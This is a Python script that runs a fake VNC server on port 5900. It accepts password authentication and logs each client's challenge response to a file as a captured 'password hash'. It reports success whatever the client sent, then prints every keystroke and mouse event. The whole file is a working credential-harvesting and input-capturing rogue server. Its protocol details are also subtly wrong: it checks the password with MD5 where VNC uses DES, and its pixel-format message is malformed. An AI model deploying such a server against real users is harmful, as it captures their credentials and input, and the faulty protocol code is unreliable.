import socket
import struct
import os
import hashlib
from PIL import Image

FAKE_PASSWORD = "secret"
WIDTH, HEIGHT = 1024, 768  # Match or exceed client screen
LOG_FILE = "passwords_log.txt"  # File to log password hashes

def generate_fake_screen():
    """Create a fake RGB screen (static blue background)."""
    img = Image.new("RGB", (WIDTH, HEIGHT), color=(30, 30, 160))
    return img.tobytes()

def recv_exact(sock, length):
    """Helper to receive an exact number of bytes from the socket."""
    data = b""
    while len(data) < length:
        more = sock.recv(length - len(data))
        if not more:
            raise ConnectionError("Connection closed")
        data += more
    return data

def log_password(password_hash):
    """Log the password hash to a text file."""
    with open(LOG_FILE, "a") as f:
        f.write(f"Received password hash: {password_hash.hex()}\n")

def start_fake_server(host='0.0.0.0', port=5900):
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.bind((host, port))
    server_sock.listen(1)
    print(f"[+] Fake VNC server listening on {host}:{port}...")

    client_sock, addr = server_sock.accept()
    print(f"[+] Connection from {addr}")

    # --- Step 1: Protocol Version Handshake ---
    version = recv_exact(client_sock, 12).decode().strip()
    print(f"[CLIENT] Version: {version}")
    client_sock.sendall(b"RFB 003.008\n")

    # --- Step 2: Security Type (Password Auth Only) ---
    client_sock.sendall(b'\x01\x02')  # 1 security type, type 2 (password)
    selected = recv_exact(client_sock, 1)
    if selected != b'\x02':
        print("[-] Client did not accept password auth.")
        client_sock.close()
        return

    # --- Step 3: Authentication Challenge ---
    challenge = os.urandom(16)
    client_sock.sendall(challenge)

    response = recv_exact(client_sock, 16)
    expected = hashlib.md5(FAKE_PASSWORD.encode() + challenge).digest()

    # Log the received password hash
    log_password(response)

    if response == expected:
        print("[+] Password match!")
    else:
        print("[!] Password hash mismatch (captured anyway).")

    # Send fake "success" regardless
    client_sock.sendall(b'\x00\x00\x00\x00')

    # --- Step 4: ClientInit ---
    shared_flag = recv_exact(client_sock, 1)
    print(f"[*] Shared session? {bool(shared_flag[0])}")

    # --- Step 5: ServerInit ---
    client_sock.sendall(struct.pack(">HH", WIDTH, HEIGHT))
    client_sock.sendall(b'\x18\x18\x00')  # 24-bit color, true color
    client_sock.sendall(struct.pack(">HHH", 255, 255, 255))  # Max R, G, B
    client_sock.sendall(b'\x10\x08\x00')  # Bit shifts
    client_sock.sendall(b'\x00' * 3)  # Padding
    name = "Fake VNC Server"
    client_sock.sendall(struct.pack(">I", len(name)))
    client_sock.sendall(name.encode())

    print("[*] Sent server init and name")

    # --- Step 6: Message Loop ---
    try:
        while True:
            msg_type = recv_exact(client_sock, 1)
            if not msg_type:
                break

            if msg_type == b'\x00':  # SetPixelFormat
                recv_exact(client_sock, 19)
                print("[*] SetPixelFormat received")

            elif msg_type == b'\x02':  # SetEncodings
                header = recv_exact(client_sock, 3)
                num_encodings = struct.unpack(">H", header[1:])[0]
                recv_exact(client_sock, num_encodings * 4)
                print("[*] Client set encodings")

            elif msg_type == b'\x03':  # FramebufferUpdateRequest
                _ = recv_exact(client_sock, 9)
                print("[*] Client requested framebuffer")

                # Respond with one rectangle, full screen, raw encoding
                fake_screen = generate_fake_screen()

                client_sock.sendall(b'\x00')  # Message type: FramebufferUpdate
                client_sock.sendall(b'\x00')  # Padding
                client_sock.sendall(struct.pack(">H", 1))  # 1 rectangle

                # Rect: x, y, width, height
                client_sock.sendall(struct.pack(">HHHH", 0, 0, WIDTH, HEIGHT))
                client_sock.sendall(struct.pack(">I", 0))  # Raw encoding
                client_sock.sendall(fake_screen)

            elif msg_type == b'\x04':  # Key event
                down_flag, key = struct.unpack(">BI", recv_exact(client_sock, 5))
                print(f"[KEY] Keycode: {key}, down: {down_flag}")

            elif msg_type == b'\x05':  # Mouse event
                button_mask, x, y = struct.unpack(">BHH", recv_exact(client_sock, 5))
                print(f"[MOUSE] Buttons: {button_mask}, Position: ({x}, {y})")

            else:
                print(f"[?] Unknown msg type: {msg_type.hex()}")

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        print("[*] Client disconnected.")
        client_sock.close()

if __name__ == "__main__":
    start_fake_server()
